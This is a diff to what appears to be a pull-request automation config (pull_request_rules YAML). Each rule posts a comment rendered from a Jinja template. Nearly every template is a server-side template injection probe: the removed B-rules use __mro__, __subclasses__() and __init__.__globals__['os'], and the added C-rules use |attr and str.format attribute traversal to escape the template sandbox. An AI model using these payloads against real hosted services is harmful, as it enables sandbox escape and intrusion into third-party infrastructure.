@@ -1,145 +1,91 @@
 pull_request_rules:
-  - name: B1
+  - name: C1
     conditions:
       - -closed
     actions:
       comment:
         message: |
-          B1=[
-          {{ author.__class__.__mro__ }}
+          C1=[
+          {{ (author|attr("format"))("{0.__class__}", author) }}
           ]
-  - name: B2
+  - name: C2
     conditions:
       - -closed
     actions:
       comment:
         message: |
-          B2=[
-          {{ author.__class__.__base__.__subclasses__() }}
+          C2=[
+          {{ (author|attr("format"))("A{0}B", author) }}
           ]
-  - name: B3
+  - name: C3
     conditions:
       - -closed
     actions:
       comment:
         message: |
-          B3=[
-          {{ author|attr("__class__")|attr("__mro__") }}
+          C3=[
+          {{ author.format("{0.__class__}", author) }}
           ]
-  - name: B4
+  - name: C4
     conditions:
       - -closed
     actions:
       comment:
         message: |
-          B4=[
-          {{ self.__init__.__globals__ }}
+          C4=[
+          {{ (author|attr("encode")) }}
           ]
-  - name: B5
+  - name: C5
     conditions:
       - -closed
     actions:
       comment:
         message: |
-          B5=[
-          {{ author.__init__.__globals__["os"] }}
+          C5=[
+          {{ (author|attr("__class__")) }}
           ]
-  - name: B6
+  - name: C6
     conditions:
       - -closed
     actions:
       comment:
         message: |
-          B6=[
-          {{ ""["__class__"] }}
+          C6=[
+          {{ commits }}
           ]
-  - name: B7
+  - name: C7
     conditions:
       - -closed
     actions:
       comment:
         message: |
-          B7=[
-          {{ author.__class__.__base__.__subclasses__()[0] }}
+          C7=[
+          {{ commits|first }}
           ]
-  - name: B8
+  - name: C8
     conditions:
       - -closed
     actions:
       comment:
         message: |
-          B8=[
-          {{ author.format }}
+          C8=[
+          {{ (author|attr("format"))("{0.__class__.__base__.__subclasses__}", author) }}
           ]
-  - name: B9
+  - name: C9
     conditions:
       - -closed
     actions:
       comment:
         message: |
-          B9=[
-          {{ author|attr("format") }}
+          C9=[
+          {{ files }}
           ]
-  - name: B10
+  - name: C10
     conditions:
       - -closed
     actions:
       comment:
         message: |
-          B10=[
-          {{ author.__getattribute__("__class__") }}
-          ]
-  - name: B11
-    conditions:
-      - -closed
-    actions:
-      comment:
-        message: |
-          B11=[
-          {{ author|join }}
-          ]
-  - name: B12
-    conditions:
-      - -closed
-    actions:
-      comment:
-        message: |
-          B12=[
-          {{ author|safe }}
-          ]
-  - name: B13
-    conditions:
-      - -closed
-    actions:
-      comment:
-        message: |
-          B13=[
-          {{ author|tojson }}
-          ]
-  - name: B14
-    conditions:
-      - -closed
-    actions:
-      comment:
-        message: |
-          B14=[
-          {{ author|map("upper")|list }}
-          ]
-  - name: B15
-    conditions:
-      - -closed
-    actions:
-      comment:
-        message: |
-          B15=[
-          {{ [author]|sort(attribute="__class__") }}
-          ]
-  - name: B16
-    conditions:
-      - -closed
-    actions:
-      comment:
-        message: |
-          B16=[
-          {{ author|select("string")|list }}
+          C10=[
+          {{ (author|attr("upper")) }}
           ]
